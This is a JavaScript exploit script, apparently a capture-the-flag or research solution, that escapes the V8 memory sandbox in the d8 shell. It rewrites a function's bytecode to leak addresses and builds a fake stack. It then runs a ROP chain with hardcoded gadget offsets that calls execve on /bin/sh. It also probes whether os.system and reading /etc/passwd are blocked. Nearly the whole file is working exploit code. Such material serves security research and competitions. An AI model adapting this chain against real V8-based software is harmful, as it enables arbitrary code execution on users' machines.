/*
    Copyright 2023 Google LLC

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/

// You will need to change all of these if you rebuild d8

// mov rsp, rbp at the end of Builtins_JSEntryTrampoline. Must be an even
// address, otherwise you will have to use something else.
const d8LeakOffset = 0xe5481cn;
// 0x00c9cba0: int3; ret;
const int3Offset = 0x00c9cba0n;
const retOffset = int3Offset + 1n;
// 0x011bb4eb: pop rdi; ret;
const popRdiOffset = 0x011bb4ebn;
// 0x00dc5a6e: pop rsi; ret;
const popRsiOffset = 0x00dc5a6en;
// 0x00d9c832: pop rdx; ret;
const popRdxOffset = 0x00d9c832n;
// 0x0109a135: pop rax; ret;
const popRaxOffset = 0x0109a135n;
// 0x0114ccd3: syscall;
const syscallOffset = 0x0114ccd3n;

// End stuff that needs updating

function hex(x) {
    return `0x${x.toString(16)}`;
}

const print = console.log;

function U8View(addr, size) {
    return new Uint8Array(new Sandbox.MemoryView(addr, size));
}

function U32View(addr, size) {
    return new Uint32Array(new Sandbox.MemoryView(addr, size));
}

function U64View(addr, size) {
    return new BigUint64Array(new Sandbox.MemoryView(addr, size));
}

function FixedArrayView(addr) {
    const v1 = U32View(addr, 8);
    const len = v1[1] >> 1;

    return U32View(addr, 8 + len * 4);
}

function setFixedArrayLength(addr, len) {
    const v = U32View(addr, 8);
    v[1] = len << 1;
}

function ObjectView(obj) {
    return U32View(Sandbox.getAddressOf(obj), Sandbox.getSizeOf(obj));
}

function BytecodeView(fn) {
    const functionView = ObjectView(fn);
    const sfiView = U32View(functionView[12/4] - 1, 8);
    return U8View(sfiView[1] - 1 + 0x22, U32View(sfiView[1] - 1, 8)[1] >> 1);
}

function TypedArrayDataAddress(a) {
    const view = new ObjectView(a);
    return view[0x34 / 4] - 1 + 8;
}

function getCageBase() {
    const mv = new BigUint64Array(new Sandbox.MemoryView(0, 32));
    return mv[3] & 0xffffffff00000000n;
}

function getLibcHeapPointer() {
    const mv = new BigUint64Array(new Sandbox.MemoryView(0x40000, 32));
    // Page::heap_
    return mv[2];
}

var broken = false;

/* Make sure that the builtins are disabled */
try {
    os.system("echo hello");
    broken = true;
} catch (e) {}

try {
    read("/etc/passwd");
    broken = true;
} catch (e) {}

if (broken) {
    throw new Error("The environment allows unintended solutions!");
}

function hax1(a, b) {
    return a + b + 1;
}

hax1();

const cageBase = getCageBase();
print(`Cage base at ${hex(cageBase)}`);

const bv = BytecodeView(hax1);
let i = 0;
function emit(x) {
    bv[i] = x;
    i++;
}

function reset() {
    i = 0;
}

reset();
// LdarExtraWide frame pointer
emit(1);
emit(0xb);
emit(0x14);
emit(0);
emit(0);
emit(0);
// ret
emit(0xaa);

const d8Leak = hax1();
print(`d8 leak: ${hex(d8Leak << 1)}`);
const upper = (getLibcHeapPointer() & 0xffffffff00000000n);
const d8base = upper + ((BigInt(d8Leak) << 1n) - d8LeakOffset);
print(`d8 at ${hex(d8base)}`);

const fakeStack = new BigUint64Array(8);
const fakeStackBuf = TypedArrayDataAddress(fakeStack);
print(`fake stack data at ${hex(fakeStackBuf)}`);

const fakeBytecode = new Uint8Array(64);
const fakeBytecodeAddress = cageBase + BigInt(TypedArrayDataAddress(fakeBytecode));
print(`fake bytecode at ${hex(fakeBytecodeAddress)}`);

const fakeStack2 = new BigUint64Array(0x1000);
const fakeStackBuf2 = cageBase + 0x100000000n
print(`fake stack data 2 at ${hex(fakeStackBuf2)}`);
print(`fake stack TypedArray at ${hex(cageBase + BigInt(Sandbox.getAddressOf(fakeStack)))}`);
let uv = U64View(Sandbox.getAddressOf(fakeStack), 32);


// r9
fakeStack[3] = 0n << 9n;
// r12
fakeStack[4] = fakeBytecodeAddress << 8n;
// rcx
const stackOffset = (fakeStackBuf2 - (cageBase + BigInt(fakeStackBuf) + 5n * 8n)) >> 3n;
print(`Stack offset: ${hex(stackOffset)}`);
fakeStack[5] = stackOffset << 8n;
fakeStack[6] = 0n;

fakeBytecode[0] = 0xaa;
fakeBytecode[0x17 + 3] = 0x0;

reset();
// ldar a0
emit(0xb);
emit(3);

// star frame pointer
emit(24);
emit(0);

// ret
emit(0xaa);

const rop_i_init = 3;
let rop_i = rop_i_init;
const rop_shift = 40n;
function rop(x) {
    const val = BigInt(x);

    if (rop_i == rop_i_init) {
        uv[1] = val << 8n;
        uv[2] &= 0xffffffffffffff00n;
    } else {
        fakeStack2[rop_i] |= val << rop_shift;
        fakeStack2[rop_i + 1] = val >> (64n - rop_shift);
    }

    rop_i++;
}

function rebase(x) {
    return d8base + BigInt(x);
}

const binsh_address = fakeStackBuf2 + 0x800n * 8n;
const argv_address = fakeStackBuf2 + 0x801n * 8n;
// /bin/sh
fakeStack2[0x800] = 0x68732f6e69622fn;
fakeStack2[0x801] = binsh_address;
fakeStack2[0x802] = 0n;

// Change this to int3Offset for debugging
rop(rebase(retOffset))
// execve("/bin/sh")
rop(rebase(popRdiOffset));
rop(binsh_address);
rop(rebase(popRsiOffset));
rop(argv_address);
rop(rebase(popRdxOffset));
rop(0);
rop(rebase(popRaxOffset));
rop(59);
rop(rebase(syscallOffset));

hax1(fakeStack);
